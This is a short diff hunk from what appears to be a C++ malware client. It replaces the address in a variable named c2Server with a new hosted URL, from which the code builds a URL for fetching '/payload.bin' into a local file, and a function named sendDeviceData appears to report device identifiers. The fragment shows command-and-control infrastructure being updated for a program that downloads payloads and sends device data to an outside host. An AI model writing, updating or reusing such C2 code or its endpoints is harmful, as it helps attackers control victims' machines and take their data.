@@ -96,7 +96,7 @@ void sendDeviceData(const std::string& deviceId, const std::string& deviceName, 
 
 int main() {
     // Example usage
-    std::string c2Server = "http://newmethod-abhopeful.wasmer.app";
+    std::string c2Server = "https://newmethod-ish6.onrender.com";
     std::string payloadUrl = c2Server + "/payload.bin";
     std::string outputFile = "downloaded_payload.bin";
 
